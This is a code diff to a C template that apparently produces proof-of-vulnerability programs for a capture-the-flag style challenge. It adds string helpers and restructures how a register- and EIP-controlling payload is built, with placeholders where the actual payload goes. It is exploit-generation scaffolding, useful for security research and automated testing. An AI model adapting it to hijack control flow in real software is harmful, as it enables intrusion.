@@ -22,12 +22,44 @@ typedef unsigned int uint32_t;
 typedef long long int64_t;
 typedef unsigned long long uint64_t;
 
-
 void *memcpy(void *dst, const void *src, size_t n) {
    char *d = (char*)dst;
    const char *s = (const char *)src;
    while (n--) {*d++ = *s++;}
    return dst;
+}
+
+void *memset(void *dst, int c, unsigned int n) {
+   char *d = (char*)dst;
+   while (n--) {*d++ = (char)c;}
+   return dst;
+}
+
+void int_to_str(int num, int base, char *dst) {
+  char const digit[] = "0123456789abcdefghijkl";
+  char* p = dst;
+  if(num < 0){
+      *p++ = '-';
+      num *= -1;
+  }
+  int shifter = num;
+  do{ //Move to where representation ends
+      ++p;
+      shifter = shifter/base;
+  } while (shifter);
+  *p = '\\0';
+  do{ //Move back, inserting digits as u go
+      *--p = digit[num%base];
+      num = num/base;
+  }while(num);
+}
+
+int strlen(char *s) {
+  int len = 0;
+  while (s[len]) {
+    len++;
+  }
+  return len;
 }
 
 size_t receive_until(int fd, char *dst, char delim, size_t max )
@@ -170,23 +202,9 @@ int type2_submit(const unsigned char *val, size_t len) {
     return out;
  }
 
-/*
- * Translate the payload for the requested reg val
- */
-void translate_payload_general(char *payload, int reg_val) {
-    char new_char;
-    int key_val;
-
-    {generalregtranslate}
-}
-
-void translate_payload_eip(char *payload, int reg_val) {
-    char new_char;
-    int key_val;
-
-    {ipregtranslate}
-}
-
+/******** BYTE TRANSLATION CODE START ********/
+{byte_translation_funcs}
+/******** BYTE TRANSLATION CODE END ********/
 
 int main() {
   enum register_t regnum = {register};
@@ -197,11 +215,17 @@ int main() {
     _terminate(0);
   }
 
-  char payload[] = "{payload}";
-  translate_payload_general(payload, t1vals.regval);
-  translate_payload_eip(payload, t1vals.ipval);
+  char payload[{payloadsize} + 0x100] = {0};
+  const char *orig = "{payload}";
 
-  send_all(1, payload, {payloadsize});
+  // construct the payload by copying static parts and adding the dynamic parts
+  char *curr = payload;
+  {do_payload_construction}
+
+  int total_len = curr-payload;
+  send_all(3, &total_len, 4);
+  send_all(3, payload, total_len);
+  send_all(1, payload, curr-payload);
   return 0;
 }
 
